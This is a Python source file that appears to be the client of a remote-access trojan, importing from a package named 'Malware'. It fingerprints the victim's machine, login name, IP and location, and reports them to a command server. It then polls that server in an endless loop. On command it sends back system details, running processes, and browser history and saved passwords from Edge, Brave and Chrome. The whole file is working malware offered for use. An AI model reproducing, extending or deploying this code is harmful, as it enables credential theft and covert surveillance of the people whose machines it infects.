import requests
import wmi
import os
from Malware import info_grabber
import time
from Malware.Browsers import Browser

def get_windows_uuid():
    c = wmi.WMI()
    system = c.Win32_ComputerSystemProduct()[0]
    return system.UUID

URL = "http://localhost:8000"
UUID = get_windows_uuid()
NAME = os.getlogin()

def identify() -> bool:
    r = requests.get('https://ipinfo.io/json').json()
    ip= r['ip']
    country = r['country']
    location = r['loc']
    r = requests.post(URL + "/api/client/identify", json={"uuid": UUID,"name":NAME,'ip':ip,"country": country,"location":location})
    if r.status_code == 200 and r.json()['Status'] == "True":
        return True
    else:
        return False
        
def check_is_commanded()-> tuple[str]|None:
    r = requests.post(URL + "/api/client/command",json={"uuid":UUID})
    r = r.json()
    if r['Status']:
        Data = r['Data']
        command = Data['command']
        target  = Data['target']
        print(Data)
        try:
            parameter = Data['parameter']
        except:
            parameter = False
        if parameter:
            command_manager(str(command).strip(), str(target).strip(), str(parameter).strip())
        else:
            command_manager(str(command).strip(), str(target).strip(),parameter=None)

    else:
        return None

def text_response(uuid:str,command:str,response:str,status:int):
    r = requests.post(URL + "/api/client/response/text",json={"uuid":uuid,"command":command,"response":response,"result":status})
    r.json()
    return r.status_code
def get_info(command:str,spec="all"):
        Data = f"Command: {command} spec: {spec}"
        try:
            if spec == "all":
                Data = str(info_grabber.Grabber.get_all())
            elif spec == "cpu":
                Data = str(info_grabber.Grabber.get_cpu_info())
            elif spec == "ram":
                Data = str(info_grabber.Grabber.get_ram_info())
            elif spec == "disk":
                Data = str(info_grabber.Grabber.get_disk_info())
            elif spec == "network":
                Data = str(info_grabber.Grabber.get_network_info())
            elif spec == "motherboard":
                Data = str(info_grabber.Grabber.get_motherboard_info())
            elif spec == "os":
                Data = str(info_grabber.Grabber.get_os_info())
            elif spec == "gpu":
                Data = str(info_grabber.Grabber.get_gpu_info())
            elif spec == "screen":
                Data = str(info_grabber.Grabber.get_screen_info())
            elif spec == "rnp":
                Data = str(info_grabber.Grabber.get_running_processes())
                                
            if len(Data) > 1 and Data != f"Command: {command} spec: {spec}":
                text_response(UUID,command,Data,1)
            else:
                text_response(UUID,command,Data,0)
        except:
                text_response(UUID,command,Data,0)

def browser_data(target:str="all",browser:str="all"):
    try:
        if browser == "edge":
            if target == "all":
               Data = str(Browser.Edge.get_all())
            elif target == "history":
                Data = str(Browser.Edge.get_history())
            elif target == "password":
                Data = str(Browser.Edge.get_passwords())
        elif browser == "brave":
            if target == "all":
               Data = str(Browser.Brave.get_all())
            elif target == "history":
                Data = str(Browser.Brave.get_history())
            elif target == "password":
                Data = str(Browser.Brave.get_passwords())
        if browser == "chrome":
            if target == "all":
               Data = str(Browser.Chrome.get_all())
            elif target == "history":
                Data = str(Browser.Chrome.get_history())
            elif target == "password":
                Data = str(Browser.Chrome.get_passwords())
        elif browser == "all":
            Data = str(Browser.All.get_all_browsers())
        
        text_response(UUID,"browser_data",Data,1)

    except:
        Data = " "
        text_response(UUID,"browser_data",Data,0)
         
def command_manager(command, target, parameter):
    if target == UUID:
        if command == "info":
            if parameter:
                get_info(spec=parameter,command=command)
            else:
                get_info(command=command)
        elif command == "browser_data":
            if parameter != None:
                browser,param = parameter.split(",")
                browser_data(browser=browser,target=param)
            else:
                browser_data()
            
            
            
            
identify()
while True:
    
    time.sleep(2)
    check_is_commanded()
        